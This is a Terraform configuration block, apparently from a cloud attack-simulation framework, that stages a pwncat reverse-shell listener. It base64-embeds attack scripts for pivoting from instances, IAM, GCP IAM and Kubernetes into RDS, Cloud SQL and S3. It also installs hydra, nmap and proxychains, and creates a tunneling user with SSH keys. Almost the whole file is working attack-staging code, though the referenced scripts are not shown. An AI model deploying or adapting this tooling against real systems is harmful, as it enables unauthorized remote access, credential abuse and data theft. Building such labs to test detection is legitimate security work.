locals {
    listen_port = var.inputs["listen_port"]
    listen_ip = var.inputs["listen_ip"]
    attack_dir = "/pwncat"
    payload = <<-EOT
    if [ -e "/tmp/pwncat_session.lock" ]  && screen -ls | grep -q "pwncat"; then
        log "Pwncat session lock /tmp/pwncat_session.lock exists and pwncat screen session running. Skipping setup."
    else
        rm -f "/tmp/pwncat_session.lock"
        log "Session lock doesn't exist and screen session not runing. Continuing..."
        log "setting up reverse shell listener: ${local.listen_ip}:${local.listen_port}"
        screen -S pwncat -X quit
        screen -wipe
        log "cleaning app directory"
        rm -rf ${local.attack_dir}
        mkdir -p ${local.attack_dir}/plugins ${local.attack_dir}/resources
        cd ${local.attack_dir}
        echo ${local.listener} | base64 -d > listener.py
        echo ${local.responder} | base64 -d > plugins/responder.py
        echo ${local.instance2rds} | base64 -d > resources/instance2rds.sh
        echo ${local.iam2rds} | base64 -d > resources/iam2rds.sh
        echo ${local.gcpiam2cloudsql} | base64 -d > resources/gcpiam2cloudsql.sh
        echo ${local.scan2kubeshell} | base64 -d > resources/scan2kubeshell.sh
        echo ${local.kube2s3} | base64 -d > resources/kube2s3.sh 
        log "installing required python3.9..."
        apt-get install -y python3.9 python3.9-venv >> $LOGFILE 2>&1
        curl https://bootstrap.pypa.io/get-pip.py -o get-pip.py >> $LOGFILE 2>&1
        python3.9 get-pip.py >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        python3.9 -m pip install -U pip setuptools wheel setuptools_rust jinja2 jc >> $LOGFILE 2>&1
        python3.9 -m pip install -U pwncat-cs >> $LOGFILE 2>&1
        log "wait before using module..."
        sleep 5
        if ! ls /home/socksuser/.ssh/socksuser_key > /dev/null; then
            log "adding tunneled port scanning user - socksuser..."
            adduser socksuser >> $LOGFILE 2>&1
            log "adding ssh keys for socks user..."
            sudo -H -u socksuser /bin/bash -c "mkdir -p /home/socksuser/.ssh" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "ssh-keygen -t rsa -b 4096 -f /home/socksuser/.ssh/socksuser_key" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "cat ~/.ssh/socksuser_key.pub >> /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
            sudo -H -u socksuser /bin/bash -c "chmod 600 /home/socksuser/.ssh/authorized_keys" >> $LOGFILE 2>&1
            log "socksuser setup complete..."
        fi
        START_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
        while true; do
            PWNCAT_LOG="/tmp/pwncat.log"
            for i in `seq $((MAXLOG-1)) -1 1`; do mv "$PWNCAT_LOG."{$i,$((i+1))} 2>/dev/null || true; done
            mv $PWNCAT_LOG "$PWNCAT_LOG.1" 2>/dev/null || true
            log "starting background process via screen..."
            screen -S pwncat -X quit
            screen -wipe
            nohup /bin/bash -c "screen -d -L -Logfile $PWNCAT_LOG -S pwncat -m python3.9 listener.py --port ${local.listen_port}" >/dev/null 2>&1 &
            screen -S pwncat -X colon "logfile flush 0^M"
            log "Checking for listener..."
            TIMEOUT=1800
            START_TIME=$(date +%s)
            while true; do
                CURRENT_TIME=$(date +%s)
                ELAPSED_TIME=$((CURRENT_TIME - START_TIME))
                if grep "listener created" $PWNCAT_LOG; then
                    log "Found listener created log in $PWNCAT_LOG - checking for port response"
                    while ! nc -z -w 5 -vv 127.0.0.1 ${local.listen_port} > /dev/null; do
                        log "failed check - waiting for pwncat port response";
                        sleep 30;
                        CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
                        if [ "$CHECK_HASH" != "$START_HASH" ]; then
                            log "payload update detected - exiting loop"
                            break 3
                        fi
                    done;
                    log "Sucessfully connected to 127.0.0.1:${local.listen_port}"
                    break
                fi
                if [ $ELAPSED_TIME -gt $TIMEOUT ]; then
                    log "Failed to find listener created log for pwncat - timeout after $TIMEOUT seconds"
                    exit 1
                fi
            done
            log "responder started."
            log "starting sleep for 30 minutes - blocking new tasks while accepting connections..."
            sleep 1800
            log "sleep complete - checking for running sessions..."
            while [ -e "/tmp/pwncat_session.lock" ]  && screen -ls | grep -q "pwncat"; do
                log "pwncat session still running - waiting before restart..."
                sleep 600
            done
            log "no pwncat sessions found - continuing..."
            CHECK_HASH=$(sha256sum --text /tmp/payload_$SCRIPTNAME | awk '{ print $1 }')
            if [ "$CHECK_HASH" != "$START_HASH" ]; then
                log "payload update detected - exiting loop"
                break
            else
                log "restarting loop..."
            fi
        done
    fi
    log "done."
    EOT

    listener        = base64encode(file(
                                "${path.module}/resources/listener.py", 
                            ))
    responder       = base64encode(templatefile(
                                "${path.module}/resources/responder.py", 
                                {
                                    default_payload = var.inputs["payload"],
                                    iam2rds_role_name = var.inputs["iam2rds_role_name"],
                                    iam2rds_session_name = "${var.inputs["iam2rds_session_name"]}-${var.inputs["deployment"]}",
                                    reverse_shell_host = var.inputs["reverse_shell_host"],
                                    reverse_shell_port = var.inputs["reverse_shell_port"],
                                }
                            ))
    instance2rds    = base64encode(templatefile(
                                "${path.module}/resources/instance2rds.sh", 
                                {
                                    region = var.inputs["region"],
                                    environment = var.inputs["environment"],
                                    deployment = var.inputs["deployment"]
                                }
                            ))

    iam2rds         = base64encode(templatefile(
                                "${path.module}/resources/iam2rds.sh", 
                                {
                                    region = var.inputs["region"],
                                    environment = var.inputs["environment"],
                                    deployment = var.inputs["deployment"],
                                    iam2rds_role_name = var.inputs["iam2rds_role_name"]
                                    iam2rds_session_name = "${var.inputs["iam2rds_session_name"]}-${var.inputs["deployment"]}"
                                }
                            ))
    gcpiam2cloudsql = base64encode(templatefile(
                                "${path.module}/resources/gcpiam2cloudsql.sh", 
                                {
                                    region = var.inputs["region"],
                                    environment = var.inputs["environment"],
                                    deployment = var.inputs["deployment"]
                                }
                            ))

    scan2kubeshell = base64encode(file(
                                "${path.module}/resources/scan2kubeshell.sh"
                            ))
    
    kube2s3 = base64encode(file(
                                "${path.module}/resources/kube2s3.sh"
                            ))

    base64_payload = templatefile("${path.root}/modules/common/any/payload/linux/delayed_start.sh", { config = {
        script_name = var.inputs["tag"]
        log_rotation_count = 2
        apt_pre_tasks = ""
        apt_packages = "proxychains4 nmap hydra python3-pip"
        apt_post_tasks = ""
        yum_pre_tasks =  <<-EOT
        if ! command -v proxychains4 > /dev/null || ! command -v hydra > /dev/null || ! command -v hydra > /dev/null; then
            yum update -y
            yum install -y git
            yum groupinstall -y 'Development Tools'
            # proxychains4
            cd /usr/local/src
            git clone https://github.com/rofl0r/proxychains-ng
            cd proxychains-ng
            ./configure && make && make install
            make install-config
            # hydra
            cd /usr/local/src
            git clone https://github.com/vanhauser-thc/thc-hydra
            cd thc-hydra
            ./configure && make && make install
        fi
        EOT
        yum_packages = "nmap python3-pip"
        yum_post_tasks = ""
        script_delay_secs = 30
        next_stage_payload = local.payload
    }})

    outputs = {
        base64_payload = base64gzip(local.base64_payload)
        base64_uncompressed_payload = base64encode(local.base64_payload)
        base64_uncompressed_payload_additional = [
            {
                name = "${basename(abspath(path.module))}_instance2rds.sh"
                content = local.instance2rds
            },
            {
                name = "${basename(abspath(path.module))}_iam2rds.sh"
                content = local.iam2rds
            },
            {
                name = "${basename(abspath(path.module))}_scan2kubeshell.sh"
                content = local.scan2kubeshell
            },
            {
                name = "${basename(abspath(path.module))}_kube2s3.sh"
                content = local.kube2s3
            },
            {
                name = "${basename(abspath(path.module))}_gcpiam2cloudsql.sh"
                content = local.gcpiam2cloudsql
            }
        ]
    }
}